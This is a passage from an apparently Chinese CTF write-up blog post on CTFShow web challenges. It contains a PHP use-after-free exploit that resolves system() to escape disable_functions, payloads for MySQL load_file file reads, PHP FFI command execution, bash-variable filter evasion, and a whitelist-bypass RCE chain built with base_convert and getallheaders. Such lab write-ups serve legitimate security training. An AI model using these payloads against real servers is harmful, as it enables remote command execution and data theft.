+</span></span><span class="line"><span class="cl">            $ptr &gt;&gt;= 8;
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">        return $out;
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    function write(&amp;$str, $p, $v, $n = 8) {
+</span></span><span class="line"><span class="cl">        $i = 0;
+</span></span><span class="line"><span class="cl">        for($i = 0; $i &lt; $n; $i++) {
+</span></span><span class="line"><span class="cl">            $str[$p + $i] = sprintf(&#34;%c&#34;,($v &amp; 0xff));
+</span></span><span class="line"><span class="cl">            $v &gt;&gt;= 8;
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    function leak($addr, $p = 0, $s = 8) {
+</span></span><span class="line"><span class="cl">        global $abc, $helper;
+</span></span><span class="line"><span class="cl">        write($abc, 0x68, $addr + $p - 0x10);
+</span></span><span class="line"><span class="cl">        $leak = strlen($helper-&gt;a);
+</span></span><span class="line"><span class="cl">        if($s != 8) { $leak %= 2 &lt;&lt; ($s * 8) - 1; }
+</span></span><span class="line"><span class="cl">        return $leak;
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    function parse_elf($base) {
+</span></span><span class="line"><span class="cl">        $e_type = leak($base, 0x10, 2);
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">        $e_phoff = leak($base, 0x20);
+</span></span><span class="line"><span class="cl">        $e_phentsize = leak($base, 0x36, 2);
+</span></span><span class="line"><span class="cl">        $e_phnum = leak($base, 0x38, 2);
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">        for($i = 0; $i &lt; $e_phnum; $i++) {
+</span></span><span class="line"><span class="cl">            $header = $base + $e_phoff + $i * $e_phentsize;
+</span></span><span class="line"><span class="cl">            $p_type  = leak($header, 0, 4);
+</span></span><span class="line"><span class="cl">            $p_flags = leak($header, 4, 4);
+</span></span><span class="line"><span class="cl">            $p_vaddr = leak($header, 0x10);
+</span></span><span class="line"><span class="cl">            $p_memsz = leak($header, 0x28);
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">            if($p_type == 1 &amp;&amp; $p_flags == 6) { 
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
+</span></span><span class="line"><span class="cl">                $data_size = $p_memsz;
+</span></span><span class="line"><span class="cl">            } else if($p_type == 1 &amp;&amp; $p_flags == 5) { 
+</span></span><span class="line"><span class="cl">                $text_size = $p_memsz;
+</span></span><span class="line"><span class="cl">            }
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">        if(!$data_addr || !$text_size || !$data_size)
+</span></span><span class="line"><span class="cl">            return false;
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">        return [$data_addr, $text_size, $data_size];
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    function get_basic_funcs($base, $elf) {
+</span></span><span class="line"><span class="cl">        list($data_addr, $text_size, $data_size) = $elf;
+</span></span><span class="line"><span class="cl">        for($i = 0; $i &lt; $data_size / 8; $i++) {
+</span></span><span class="line"><span class="cl">            $leak = leak($data_addr, $i * 8);
+</span></span><span class="line"><span class="cl">            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) {
+</span></span><span class="line"><span class="cl">                $deref = leak($leak);
+</span></span><span class="line"><span class="cl">                
+</span></span><span class="line"><span class="cl">                if($deref != 0x746e6174736e6f63)
+</span></span><span class="line"><span class="cl">                    continue;
+</span></span><span class="line"><span class="cl">            } else continue;
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">            $leak = leak($data_addr, ($i + 4) * 8);
+</span></span><span class="line"><span class="cl">            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) {
+</span></span><span class="line"><span class="cl">                $deref = leak($leak);
+</span></span><span class="line"><span class="cl">                
+</span></span><span class="line"><span class="cl">                if($deref != 0x786568326e6962)
+</span></span><span class="line"><span class="cl">                    continue;
+</span></span><span class="line"><span class="cl">            } else continue;
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">            return $data_addr + $i * 8;
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    function get_binary_base($binary_leak) {
+</span></span><span class="line"><span class="cl">        $base = 0;
+</span></span><span class="line"><span class="cl">        $start = $binary_leak &amp; 0xfffffffffffff000;
+</span></span><span class="line"><span class="cl">        for($i = 0; $i &lt; 0x1000; $i++) {
+</span></span><span class="line"><span class="cl">            $addr = $start - 0x1000 * $i;
+</span></span><span class="line"><span class="cl">            $leak = leak($addr, 0, 7);
+</span></span><span class="line"><span class="cl">            if($leak == 0x10102464c457f) {
+</span></span><span class="line"><span class="cl">                return $addr;
+</span></span><span class="line"><span class="cl">            }
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    function get_system($basic_funcs) {
+</span></span><span class="line"><span class="cl">        $addr = $basic_funcs;
+</span></span><span class="line"><span class="cl">        do {
+</span></span><span class="line"><span class="cl">            $f_entry = leak($addr);
+</span></span><span class="line"><span class="cl">            $f_name = leak($f_entry, 0, 6);
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">            if($f_name == 0x6d6574737973) {
+</span></span><span class="line"><span class="cl">                return leak($addr + 8);
+</span></span><span class="line"><span class="cl">            }
+</span></span><span class="line"><span class="cl">            $addr += 0x20;
+</span></span><span class="line"><span class="cl">        } while($f_entry != 0);
+</span></span><span class="line"><span class="cl">        return false;
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    function trigger_uaf($arg) {
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">        $arg = str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);
+</span></span><span class="line"><span class="cl">        $vuln = new Vuln();
+</span></span><span class="line"><span class="cl">        $vuln-&gt;a = $arg;
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    if(stristr(PHP_OS, &#39;WIN&#39;)) {
+</span></span><span class="line"><span class="cl">        die(&#39;This PoC is for *nix systems only.&#39;);
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    $n_alloc = 10; 
+</span></span><span class="line"><span class="cl">    $contiguous = [];
+</span></span><span class="line"><span class="cl">    for($i = 0; $i &lt; $n_alloc; $i++)
+</span></span><span class="line"><span class="cl">        $contiguous[] = str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    trigger_uaf(&#39;x&#39;);
+</span></span><span class="line"><span class="cl">    $abc = $backtrace[1][&#39;args&#39;][0];
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    $helper = new Helper;
+</span></span><span class="line"><span class="cl">    $helper-&gt;b = function ($x) { };
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    if(strlen($abc) == 79 || strlen($abc) == 0) {
+</span></span><span class="line"><span class="cl">        die(&#34;UAF failed&#34;);
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    $closure_handlers = str2ptr($abc, 0);
+</span></span><span class="line"><span class="cl">    $php_heap = str2ptr($abc, 0x58);
+</span></span><span class="line"><span class="cl">    $abc_addr = $php_heap - 0xc8;
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    write($abc, 0x60, 2);
+</span></span><span class="line"><span class="cl">    write($abc, 0x70, 6);
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    write($abc, 0x10, $abc_addr + 0x60);
+</span></span><span class="line"><span class="cl">    write($abc, 0x18, 0xa);
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    $closure_obj = str2ptr($abc, 0x20);
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    $binary_leak = leak($closure_handlers, 8);
+</span></span><span class="line"><span class="cl">    if(!($base = get_binary_base($binary_leak))) {
+</span></span><span class="line"><span class="cl">        die(&#34;Couldn&#39;t determine binary base address&#34;);
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    if(!($elf = parse_elf($base))) {
+</span></span><span class="line"><span class="cl">        die(&#34;Couldn&#39;t parse ELF header&#34;);
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    if(!($basic_funcs = get_basic_funcs($base, $elf))) {
+</span></span><span class="line"><span class="cl">        die(&#34;Couldn&#39;t get basic_functions address&#34;);
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    if(!($zif_system = get_system($basic_funcs))) {
+</span></span><span class="line"><span class="cl">        die(&#34;Couldn&#39;t get zif_system address&#34;);
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    $fake_obj_offset = 0xd0;
+</span></span><span class="line"><span class="cl">    for($i = 0; $i &lt; 0x110; $i += 8) {
+</span></span><span class="line"><span class="cl">        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    write($abc, 0x20, $abc_addr + $fake_obj_offset);
+</span></span><span class="line"><span class="cl">    write($abc, 0xd0 + 0x38, 1, 4); 
+</span></span><span class="line"><span class="cl">    write($abc, 0xd0 + 0x68, $zif_system); 
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    ($helper-&gt;b)($cmd);
+</span></span><span class="line"><span class="cl">    exit();
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">ctfshow(&#34;cat /flag0.txt&#34;);ob_end_flush();
+</span></span><span class="line"><span class="cl">#需要通过url编码哦
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>利用mysql load_file读文件</p>
+<pre class="wp-block-code"><code>c=try {
+    $dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root','root');
+
+    foreach ($dbh->query('select load_file("/flag36.txt")') as $row) {
+        echo ($row&#91;0]) . "|";
+    }
+    $dbh = null;
+} catch (PDOException $e) {
+    echo $e->getMessage();
+    exit(0);
+}
+exit(0);</code></pre>
+<p>PHP7.4-FFI</p>
+<blockquote class="wp-block-quote">
+  <p>
+    (PHP 7 >= 7.4.0, PHP 8)<br />FFI::cdef — Creates a new FFI object<br />FFI（Foreign Function Interface），即外部函数接口，是指在一种语言里调用另一种语言代码的技术。
+  </p>
+</blockquote>
+<pre class="wp-block-code"><code>c=$ffi = FFI::cdef("int system(const char *command);");
+$a='/flagfile > 1.txt';
+$ffi->system($a);</code></pre>
+<p>使用bash的内置变量进行绕过，不完全总结</p>
+<pre class="wp-block-code"><code>${PATH}          /root/bin
+${PATH:~0}          n
+${PATH:~1}          in
+${PATH:~2}          bin
+${PATH:~A}          n
+${PATH:~a}          n
+${PATH:5:4}         /bin
+
+${PWD}          /var/www/html
+${PWD:~A}          l
+${PWD::${#SHLVL}}  /
+
+SHLVL代表shell打开的深度,进程第一次打开shell时${SHLVL}=1
+BASH_SUBSHELL代表一个 Bash 进程实例中多个子 Shell嵌套深度，${BASH_SUBSHELL}=0
+HISTFILE设定历史脚本文件的路径文件名，通常是/root/.bash_history
+RANDOM取随机数
+$?上一条命令执行结束后的传回值。通常0代表执行成功，非0代表执行有误。
+
+${#x}为x变量结果的长度，如${#HISTFILE}=19
+
+</code></pre>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">常用:
+</span></span><span class="line"><span class="cl">FLAG|PATH|BASH|HOME|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|PHP_VERSION|RANDOM|PWD|HOME
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>参考<a rel="noreferrer noopener" href="https://www.cnblogs.com/sparkdev/p/9934595.html" target="_blank" rel="nofollow" ><a href="https://www.cnblogs.com/sparkdev/p/9934595.html" target="_blank" rel="noopener noreffer ">https://www.cnblogs.com/sparkdev/p/9934595.html</a></a>、<a href="https://www.cnblogs.com/zengkefu/p/5558161.html" target="_blank" rel="noreferrer noopener" rel="nofollow" ><a href="https://www.cnblogs.com/zengkefu/p/5558161.html" target="_blank" rel="noopener noreffer ">https://www.cnblogs.com/zengkefu/p/5558161.html</a></a></p>
+<p>利用<code>&lt;A</code>的报错，No such file or directory，能返回值1。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#34;OS error code   1:  Operation not permitted&#34;
+</span></span><span class="line"><span class="cl">&#34;OS error code   2:  No such file or directory&#34;
+</span></span><span class="line"><span class="cl">&#34;OS error code   3:  No such process&#34;
+</span></span><span class="line"><span class="cl">&#34;OS error code   4:  Interrupted system call&#34;
+</span></span><span class="line"><span class="cl">&#34;OS error code   5:  Input/output error&#34;
+</span></span><span class="line"><span class="cl">&#34;OS error code   6:  No such device or address&#34;
+</span></span><span class="line"><span class="cl">&#34;OS error code   7:  Argument list too long&#34;
+</span></span><span class="line"><span class="cl">&#34;OS error code   8:  Exec format error&#34;
+</span></span><span class="line"><span class="cl">&#34;OS error code   9:  Bad file descriptor&#34;
+</span></span><span class="line"><span class="cl">&#34;OS error code  10:  No child processes&#34;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">if(!isset($_GET[&#39;c&#39;])){
+</span></span><span class="line"><span class="cl">    show_source(__FILE__);
+</span></span><span class="line"><span class="cl">}else{
+</span></span><span class="line"><span class="cl">    //例子 c=20-1
+</span></span><span class="line"><span class="cl">    $content = $_GET[&#39;c&#39;];
+</span></span><span class="line"><span class="cl">    if (strlen($content) &gt;= 80) {
+</span></span><span class="line"><span class="cl">        die(&#34;太长了不会算&#34;);
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">    $blacklist = [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&#34;&#39;, &#39;`&#39;, &#39;\[&#39;, &#39;\]&#39;];
+</span></span><span class="line"><span class="cl">    foreach ($blacklist as $blackitem) {
+</span></span><span class="line"><span class="cl">        if (preg_match(&#39;/&#39; . $blackitem . &#39;/m&#39;, $content)) {
+</span></span><span class="line"><span class="cl">            die(&#34;请不要输入奇奇怪怪的字符&#34;);
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">    $whitelist = [&#39;abs&#39;, &#39;acos&#39;, &#39;acosh&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;, &#39;base_convert&#39;, &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;];
+</span></span><span class="line"><span class="cl">    preg_match_all(&#39;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#39;, $content, $used_funcs);  
+</span></span><span class="line"><span class="cl">    foreach ($used_funcs[0] as $func) {
+</span></span><span class="line"><span class="cl">        if (!in_array($func, $whitelist)) {
+</span></span><span class="line"><span class="cl">            die(&#34;请不要输入奇奇怪怪的函数&#34;);
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">    //帮你算出答案
+</span></span><span class="line"><span class="cl">    eval(&#39;echo &#39;.$content.&#39;;&#39;);
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>常用数学函数<a rel="noreferrer noopener" href="https://www.w3school.com.cn/php/php_ref_math.asp" target="_blank" rel="nofollow" ><a href="https://www.w3school.com.cn/php/php_ref_math.asp" target="_blank" rel="noopener noreffer ">https://www.w3school.com.cn/php/php_ref_math.asp</a></a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">base_convert(number,frombase,tobase);
+</span></span><span class="line"><span class="cl">参数	描述
+</span></span><span class="line"><span class="cl">number	    必需。规定要转换的数。
+</span></span><span class="line"><span class="cl">frombase	必需。规定数字原来的进制。介于 2 和 36 之间（包括 2 和 36）。高于十进制的数字用字母 a-z 表示，例如 a 表示 10，b 表示 11 以及 z 表示 35。
+</span></span><span class="line"><span class="cl">tobase	    必需。规定要转换的进制。介于 2 和 36 之间（包括 2 和 36）。高于十进制的数字用字母 a-z 表示，例如 a 表示 10，b 表示 11 以及 z 表示 35。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">bindec — 二进制转换为十进制
+</span></span><span class="line"><span class="cl">bindec ( string $binary_string ) : number
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">decbin — 十进制转换为二进制
+</span></span><span class="line"><span class="cl">decbin ( int $number ) : string
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">dechex — 十进制转换为十六进制
+</span></span><span class="line"><span class="cl">dechex ( int $number ) : string
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">decoct — 十进制转换为八进制
+</span></span><span class="line"><span class="cl">decoct ( int $number ) : string
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">hexdec — 十六进制转换为十进制
+</span></span><span class="line"><span class="cl">hexdec ( int $number ) : string
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>[]</code>可用<code>{}</code>代替。</p>
+<p>构造过程</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">c=$_GET[a]($_GET[b])&amp;a=system&amp;b=cat flag
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">echo base_convert(&#39;hex2bin&#39;, 36, 10);
+</span></span><span class="line"><span class="cl">结果  37907361743
+</span></span><span class="line"><span class="cl">base_convert(37907361743,10,36);------&gt;hex2bin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">echo hexdec(bin2hex(&#34;_GET&#34;));
+</span></span><span class="line"><span class="cl">结果 1598506324
+</span></span><span class="line"><span class="cl">base_convert(37907361743,10,36)(dechex(1598506324));------&gt;_GET
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">用白名单中的函数名充当变量名
+</span></span><span class="line"><span class="cl">构造$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi{abs}($$pi{cos});&amp;abs=system&amp;cos=cat flag.php
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>另一种方法，配合<code>getallheaders</code>函数，通过php头构造命令。</p>
+<pre class="wp-block-code"><code>echo base_convert('getallheaders',30,10);
+//得到8768397090111664438，这里不使用36进制是因为精度会丢失，尝试到30的时候成功
+
+c=$pi=base_convert,$pi(1751504350,10,36)($pi(8768397090111664438,10,30)(){1}) 
+PHPHeader  1-----tac flag.php</code></pre><blockquote>
+</blockquote>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2022-03-01</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/2022-03-01-ctfshow-web%E5%85%A5%E9%97%A81/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://hannibal0x.github.io/2022-03-01-ctfshow-web%E5%85%A5%E9%97%A81/" data-title="CTFShow-web入门（1）" data-hashtags="CTF,Web安全"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://hannibal0x.github.io/2022-03-01-ctfshow-web%E5%85%A5%E9%97%A81/" data-hashtag="CTF"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://hannibal0x.github.io/2022-03-01-ctfshow-web%E5%85%A5%E9%97%A81/" data-title="CTFShow-web入门（1）"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://hannibal0x.github.io/2022-03-01-ctfshow-web%E5%85%A5%E9%97%A81/" data-title="CTFShow-web入门（1）"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://hannibal0x.github.io/2022-03-01-ctfshow-web%E5%85%A5%E9%97%A81/" data-title="CTFShow-web入门（1）"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/ctf/">CTF</a>,&nbsp;<a href="/tags/web%E5%AE%89%E5%85%A8/">Web安全</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/2022-02-28-2%E6%9C%88ctf%E7%BB%83%E4%B9%A0/" class="prev" rel="prev" title="2月CTF练习"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>2月CTF练习</a>
+            <a href="/2022-03-28-ctf%E7%BB%83%E4%B9%A0week1/" class="next" rel="next" title="CTF练习Week1">CTF练习Week1<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+<div id="comments"><div id="utterances" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://utteranc.es/">utterances</a>.
+            </noscript></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.101.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Hannibal0x</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/algoliasearch/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{"utterances":{"darkTheme":"github-dark","issueTerm":"pathname","label":"","lightTheme":"github-light","repo":"Hannibal0x/blog-comment"}},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"algoliaAppID":"LBWAPJR4IC","algoliaIndex":"blog","algoliaSearchKey":"3771060ae26cbca6e13551298e854580","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
